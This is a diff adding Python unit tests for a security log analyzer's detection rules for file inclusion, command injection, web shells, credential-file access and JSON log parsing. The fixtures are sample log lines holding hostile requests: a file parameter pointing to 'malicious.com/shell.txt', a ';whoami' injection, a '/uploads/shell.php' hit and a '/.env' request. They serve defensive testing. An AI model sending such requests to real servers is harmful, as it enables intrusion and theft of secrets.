@@ -58,5 +58,45 @@ class TestLogAnalyzer(unittest.TestCase):
         report = analyzer.analyze("\n".join(logs))
         self.assertTrue(any(t.rule_id == "R010" for t in report.threats)) # R010 is DoS
 
+    def test_lfi_rfi_detection(self):
+        analyzer = LogAnalyzer()
+        log = '192.168.1.45 - - [20/May/2026:17:00:00 +0000] "GET /index.php?file=http://malicious.com/shell.txt HTTP/1.1" 200 512'
+        report = analyzer.analyze(log)
+        self.assertTrue(any(t.rule_id == "R011" for t in report.threats))
+
+    def test_cmd_injection_detection(self):
+        analyzer = LogAnalyzer()
+        log = '192.168.1.45 - - [20/May/2026:17:00:00 +0000] "GET /run?cmd=;whoami HTTP/1.1" 200 512'
+        report = analyzer.analyze(log)
+        self.assertTrue(any(t.rule_id == "R012" for t in report.threats))
+
+    def test_web_shell_detection(self):
+        analyzer = LogAnalyzer()
+        log = '192.168.1.45 - - [20/May/2026:17:00:00 +0000] "GET /uploads/shell.php HTTP/1.1" 200 512'
+        report = analyzer.analyze(log)
+        self.assertTrue(any(t.rule_id == "R013" for t in report.threats))
+
+    def test_credential_leak_detection(self):
+        analyzer = LogAnalyzer()
+        log = '192.168.1.45 - - [20/May/2026:17:00:00 +0000] "GET /.env HTTP/1.1" 200 512'
+        report = analyzer.analyze(log)
+        self.assertTrue(any(t.rule_id == "R014" for t in report.threats))
+
+    def test_json_log_parsing(self):
+        analyzer = LogAnalyzer()
+        # Test basic JSON format with auth failure
+        json_log1 = '{"ip": "10.0.0.99", "user": "testuser", "path": "/secure/data", "method": "POST", "status": 401, "message": "unauthorized access", "timestamp": "2026-05-20T17:30:00Z"}'
+        # Test JSON format with epoch timestamp and string status
+        json_log2 = '{"client_ip": "172.16.1.100", "path": "/index.html", "status": "200 OK", "timestamp": 1779384600}' # May 20 2026 epoch
+        
+        report = analyzer.analyze(json_log1 + "\n" + json_log2)
+        self.assertEqual(report.total_entries, 2)
+        self.assertEqual(report.parsed_entries, 2)
+        ips = [item[0] for item in report.top_ips]
+        self.assertIn("10.0.0.99", ips)
+        self.assertIn("172.16.1.100", ips)
+        # Verify auth failure threat was found
+        self.assertTrue(any(t.rule_id == "R006" for t in report.threats))
+
 if __name__ == "__main__":
     unittest.main()
